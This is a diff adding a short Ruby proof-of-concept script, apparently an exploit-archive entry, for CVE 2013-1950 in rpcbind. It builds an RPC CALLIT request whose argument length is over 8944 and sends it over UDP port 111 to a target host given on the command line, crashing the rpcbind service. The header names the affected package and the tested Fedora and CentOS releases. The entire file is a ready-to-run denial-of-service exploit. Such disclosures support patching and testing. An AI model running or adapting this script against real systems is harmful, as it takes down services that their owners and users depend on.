@@ -1,0 +1,46 @@
+#!/usr/bin/ruby
+#
+#	rpcbind_udp_crash_poc.rb
+#	07/15/2013
+#	Sean Verity <veritysr1980 [at] gmail.com>
+#	CVE 2013-1950
+#
+#	rpcbind (CALLIT Procedure) UDP Crash PoC
+#	Affected Software Package: rpcbind-0.2.0-19
+#
+#	Tested on: 
+#	Fedora 17 (3.9.8-100.fc17.x86_64 #1 SMP) 
+#	CentOS 6.3 Final (2.6.32-279.22.1.el6.x86_64 #1 SMP)
+#
+#	rpcbind can be crashed by setting the argument length 
+#	value > 8944 in an RPC CALLIT procedure request over UDP.
+#
+
+require 'socket'
+
+def usage
+	abort "\nusage: ./rpcbind_udp_crash_poc.rb <target>\n\n"
+end
+
+if ARGV.length == 1
+	pkt = [rand(2**32)].pack('N')	# XID
+	pkt << [0].pack('N')			# Message Type: CALL (0)
+	pkt << [2].pack('N')			# RPC Version: 2
+	pkt << [100000].pack('N')		# Program: Portmap (100000)
+	pkt << [2].pack('N')			# Program Version: 2
+	pkt << [5].pack('N')			# Procedure: CALLIT (5)
+	pkt << [0].pack('N')			# Credentials Flavor: AUTH_NULL (0)
+	pkt << [0].pack('N')			# Length: 0
+	pkt << [0].pack('N')			# Credentials Verifier: AUTH_NULL (0)
+	pkt << [0].pack('N')			# Length: 0
+	pkt << [0].pack('N')			# Program: Unknown (0) 
+	pkt << [1].pack('N')			# Version: 1
+	pkt << [1].pack('N')			# Procedure: 1
+	pkt << [8945].pack('N')			# Argument Length
+	pkt << "crash"					# Arguments
+
+	s = UDPSocket.new
+	s.send(pkt, 0, ARGV[0], 111)
+else
+	usage
+end
